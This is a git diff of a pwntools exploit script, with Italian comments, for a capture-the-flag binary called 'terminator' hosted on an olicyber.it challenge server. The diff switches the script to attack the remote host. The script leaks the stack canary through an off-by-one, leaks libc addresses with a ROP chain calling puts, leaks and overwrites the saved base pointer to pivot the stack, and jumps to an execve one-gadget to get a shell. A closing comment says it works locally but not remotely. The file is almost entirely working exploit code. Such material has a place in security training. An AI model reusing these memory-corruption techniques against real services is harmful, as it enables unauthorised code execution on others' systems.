@@ -1,6 +1,12 @@
 from pwn import *
 
-context.binary = el = ELF('terminator')
+remo = True
+if remo:
+    el = ELF('terminator_nopatch')
+else:
+    el = ELF('terminator')
+
+context.binary = el
 
 libc = ELF('libc.so.6')
 
@@ -9,7 +15,7 @@ execve = [
     0xe6c81,
     0xe6c84
 ]
-index = 0
+index = 1
 
 # 77 - 56 overflow
 
@@ -19,14 +25,14 @@ print(f'{offset=}')
 # off by one sulla richiesta del nome
 # smetterebbe di leggere allo 00 del canary ma lo sovrascrive con 10(a capo)
 # così stampo il canary
-
-p = process('./terminator')
+if remo:
+    p = remote('terminator.challs.olicyber.it' ,10307)
+else:
+    p = process('./terminator')
 # patchelf --set-interpreter "$(pwd)/ld-linux-x86-64.so.2" --set-rpath $(pwd) ./terminator
 # gli indico solo la cartella della libc, non il file
-input()
-p.recvline()
-p.recvline()
-p.recvline()
+# input()
+p.recvuntil(b'> ')
 
 # no sendline, avrei due a capo
 p.send(b'A' * offset)
@@ -58,7 +64,7 @@ print('canary: ' + canary.hex())
 
 
 PUTS_PLT = el.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
-MAIN_PLT = el.symbols['welcome'] # el.symbols['welcome'] + 0x9d per jumpare direttamente alla seconda puts
+MAIN_PLT = el.symbols['main'] # el.symbols['welcome'] + 0x9d per jumpare direttamente alla seconda puts
 POP_RDI = 0x00000000004012fb
 RET = 0x0000000000401016
 POP_RBP = 0x0000000000401149
@@ -82,7 +88,7 @@ payload = flat({
 # dovrei aggiungere un pop rbp ma lo fa lui subito dopo il ret, quando torna in main
 
 p.recvuntil(b'> ')
-p.sendline(payload)
+p.send(payload)
 p.recvuntil(b'Goodbye!\n', drop=True)
 
 # here return address is overwritten with puts address
@@ -104,21 +110,24 @@ shell = p64(shell)
 
 # siamo di nuovo in welcome, forse al secondo read
 p.recvuntil(b'> ')
-p.sendline(b'ciao')
+p.send(b'A' * offset)
+p.recvline()
+p.recv(7)
+# new base pointer memory leak
+old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')
+old_bp = u64(old_bp)
+my_buff_addr = old_bp - 12 * 8
+print(f'New base pointer owerwrite: {hex(my_buff_addr)}')
+overwrite_bp = p64(my_buff_addr)
 print(p.recvuntil(b'> '))
 
-
-print(overwrite_bp.hex())
 payload = flat({
     8: shell,
     offset: canary,
     offset + 8: overwrite_bp,
 })
-p.sendline(payload)
-p.recvline()
 
-#p.sendline(b'cat flag.txt')
-#if b'flag{' in  p.recvline():
-#    print('funziono!!!')
+p.send(payload)
+
 p.interactive()
-# e qui dovrebbe funzionare, vanno solo aggiustate un po' di cose
+# funziona in locale ma non in remoto
